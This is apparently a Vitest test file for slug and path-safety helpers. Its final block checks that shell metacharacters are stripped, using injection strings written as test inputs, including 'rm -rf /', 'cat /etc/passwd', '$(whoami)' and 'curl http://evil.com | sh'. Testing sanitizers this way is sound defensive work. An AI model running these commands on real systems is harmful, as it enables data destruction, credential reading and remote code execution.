import { describe, it, expect } from "vitest";
import { createSlug, isPathSafe, isDirectoryNameSafe, createSlugWithFallback } from "../../src/utils/slug.js";

describe("createSlug", () => {
  it("should convert simple English text to slug", () => {
    expect(createSlug("Add Login Feature")).toBe("add-login-feature");
  });

  it("should remove Korean characters", () => {
    expect(createSlug("로그인 페이지 비밀번호 재설정 기능 추가")).toBe("");
    expect(createSlug("Add 로그인 Feature")).toBe("add-feature");
  });

  it("should remove special characters", () => {
    expect(createSlug("Fix bug #123: handle @mentions")).toBe("fix-bug-123-handle-mentions");
  });

  it("should collapse multiple hyphens", () => {
    expect(createSlug("hello   ---   world")).toBe("hello-world");
  });

  it("should trim leading and trailing hyphens", () => {
    expect(createSlug("---hello world---")).toBe("hello-world");
  });

  it("should limit to 50 characters", () => {
    const long = "a".repeat(60);
    expect(createSlug(long).length).toBeLessThanOrEqual(50);
  });

  it("should handle empty string", () => {
    expect(createSlug("")).toBe("");
  });

  it("should handle mixed Korean and English", () => {
    expect(createSlug("사용자 인증 user authentication 구현")).toBe("user-authentication");
  });

  // Path traversal security tests
  it("should remove path traversal characters", () => {
    expect(createSlug("../etc/passwd")).toBe("etc-passwd");
    expect(createSlug("..\\windows\\system32")).toBe("windows-system32");
    expect(createSlug("./config")).toBe("config");
    expect(createSlug("../../../secret")).toBe("secret");
  });

  it("should remove leading dots", () => {
    expect(createSlug("...hidden")).toBe("hidden");
    expect(createSlug(".env")).toBe("env");
  });

  it("should remove slashes and backslashes", () => {
    expect(createSlug("path/with/slashes")).toBe("path-with-slashes");
    expect(createSlug("path\\with\\backslashes")).toBe("path-with-backslashes");
  });
});

describe("isPathSafe", () => {
  it("should return false for path traversal patterns", () => {
    expect(isPathSafe("../etc/passwd")).toBe(false);
    expect(isPathSafe("..\\windows")).toBe(false);
    expect(isPathSafe("../")).toBe(false);
    expect(isPathSafe("..")).toBe(false);
  });

  it("should allow absolute paths (required for local project paths)", () => {
    expect(isPathSafe("/etc/passwd")).toBe(true);
    expect(isPathSafe("/home/user/project")).toBe(true);
  });

  it("should return false for paths ending with slash", () => {
    expect(isPathSafe("folder/")).toBe(false);
    expect(isPathSafe("folder\\")).toBe(false);
  });

  it("should return false for control characters and forbidden characters", () => {
    expect(isPathSafe("file\x00name")).toBe(false);
    expect(isPathSafe("file<name")).toBe(false);
    expect(isPathSafe("file>name")).toBe(false);
    expect(isPathSafe("file:name")).toBe(false);
    expect(isPathSafe("file|name")).toBe(false);
    expect(isPathSafe("file?name")).toBe(false);
    expect(isPathSafe("file*name")).toBe(false);
  });

  it("should return true for safe paths", () => {
    expect(isPathSafe("normal-file")).toBe(true);
    expect(isPathSafe("folder")).toBe(true);
    expect(isPathSafe("file-123")).toBe(true);
    expect(isPathSafe("validname")).toBe(true);
  });

  it("should return false for invalid input", () => {
    expect(isPathSafe("")).toBe(false);
    expect(isPathSafe(null as any)).toBe(false);
    expect(isPathSafe(undefined as any)).toBe(false);
  });
});

describe("isDirectoryNameSafe", () => {
  it("should return false for path traversal patterns", () => {
    expect(isDirectoryNameSafe("../etc/passwd")).toBe(false);
    expect(isDirectoryNameSafe("..\\windows")).toBe(false);
    expect(isDirectoryNameSafe("../")).toBe(false);
    expect(isDirectoryNameSafe("..")).toBe(false);
  });

  it("should return false for absolute paths", () => {
    expect(isDirectoryNameSafe("/etc/passwd")).toBe(false);
    expect(isDirectoryNameSafe("\\windows\\system32")).toBe(false);
    expect(isDirectoryNameSafe("C:\\Windows")).toBe(false);
  });

  it("should return false for any slashes (stricter than isPathSafe)", () => {
    expect(isDirectoryNameSafe("folder/subfolder")).toBe(false);
    expect(isDirectoryNameSafe("folder\\subfolder")).toBe(false);
    expect(isDirectoryNameSafe("1-/etc/passwd")).toBe(false);
  });

  it("should return false for control characters and forbidden characters", () => {
    expect(isDirectoryNameSafe("file\x00name")).toBe(false);
    expect(isDirectoryNameSafe("file<name")).toBe(false);
    expect(isDirectoryNameSafe("file>name")).toBe(false);
    expect(isDirectoryNameSafe("file:name")).toBe(false);
    expect(isDirectoryNameSafe("file|name")).toBe(false);
    expect(isDirectoryNameSafe("file?name")).toBe(false);
    expect(isDirectoryNameSafe("file*name")).toBe(false);
  });

  it("should return true for safe directory names", () => {
    expect(isDirectoryNameSafe("normal-file")).toBe(true);
    expect(isDirectoryNameSafe("folder")).toBe(true);
    expect(isDirectoryNameSafe("file-123")).toBe(true);
    expect(isDirectoryNameSafe("validname")).toBe(true);
    expect(isDirectoryNameSafe("42-fix-bug")).toBe(true);
  });

  it("should return false for invalid input", () => {
    expect(isDirectoryNameSafe("")).toBe(false);
    expect(isDirectoryNameSafe(null as any)).toBe(false);
    expect(isDirectoryNameSafe(undefined as any)).toBe(false);
  });
});

describe("createSlugWithFallback", () => {
  it("should use fallback for empty slug", () => {
    expect(createSlugWithFallback("")).toBe("impl");
    expect(createSlugWithFallback("한글만")).toBe("impl");
    expect(createSlugWithFallback("한글만", "custom")).toBe("custom");
  });
});

describe("createSlug - shell metacharacter sanitization", () => {
  it("should strip semicolon command chaining", () => {
    const result = createSlug("fix bug; rm -rf /");
    expect(result).not.toContain(";");
    expect(result).toBe("fix-bug-rm-rf");
  });

  it("should strip pipe characters", () => {
    const result = createSlug("feature | cat /etc/passwd");
    expect(result).not.toContain("|");
    expect(result).toBe("feature-cat-etc-passwd");
  });

  it("should strip ampersand command chaining", () => {
    const result = createSlug("update && malicious-command");
    expect(result).not.toContain("&");
    expect(result).toBe("update-malicious-command");
  });

  it("should strip dollar-sign variable/command substitution", () => {
    const result = createSlug("$(whoami)");
    expect(result).not.toContain("$");
    expect(result).not.toContain("(");
    expect(result).not.toContain(")");
    expect(result).toBe("whoami");
  });

  it("should strip backtick command substitution", () => {
    const result = createSlug("`id`");
    expect(result).not.toContain("`");
    expect(result).toBe("id");
  });

  it("should strip redirection operators", () => {
    const withOutput = createSlug("title > /tmp/pwned");
    expect(withOutput).not.toContain(">");

    const withInput = createSlug("title < /etc/passwd");
    expect(withInput).not.toContain("<");
  });

  it("should strip newlines that could break shell commands", () => {
    const result = createSlug("fix\necho injected");
    expect(result).not.toContain("\n");
    expect(result).toBe("fix-echo-injected");
  });

  it("should handle complex injection attempt in issue title", () => {
    const result = createSlug("Add feature; curl http://evil.com | sh");
    expect(result).not.toContain(";");
    expect(result).not.toContain("|");
    expect(result).toBe("add-feature-curl-http-evil-com-sh");
  });

  it("should produce path-safe output for all shell metacharacters", () => {
    const attacks = [
      "$(id)",
      "`whoami`",
      "title; evil",
      "title && evil",
      "title || evil",
      "title | evil",
      "title > /tmp/x",
    ];
    for (const attack of attacks) {
      const slug = createSlug(attack);
      expect(isPathSafe(slug) || slug === "").toBe(true);
    }
  });
});
